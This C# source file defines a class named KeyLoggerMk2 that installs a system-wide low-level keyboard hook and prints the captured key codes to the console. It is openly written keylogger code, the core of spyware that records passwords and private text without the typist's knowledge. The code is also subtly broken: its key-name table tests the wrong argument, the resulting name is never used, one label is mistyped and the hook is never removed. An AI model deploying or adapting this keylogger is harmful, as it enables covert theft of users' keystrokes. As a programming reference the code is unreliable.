﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Windows;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Reflection;
using System.Threading;

namespace Dolphin
{

    class KeyLoggerMk2
    {
        public enum HookType : int
        {
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }
        delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam,
            IntPtr lParam);


        [DllImport("user32.dll")]
        static extern bool PeekMessageA(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

        public KeyLoggerMk2()
        {
            var callback = new HookProc(InputCallback);
            var module = Process.GetCurrentProcess().MainModule?.ModuleName;
            var handle = GetModuleHandle(module);
            var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, handle, 0);

            while (true)
            {
                PeekMessageA(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                Thread.Sleep(10);
            }

        }

        private IntPtr InputCallback(int code, IntPtr wParam, IntPtr lParam)
        {
            String key = "";

            if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";
            Console.WriteLine($"{Marshal.ReadInt32(lParam)}");
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}
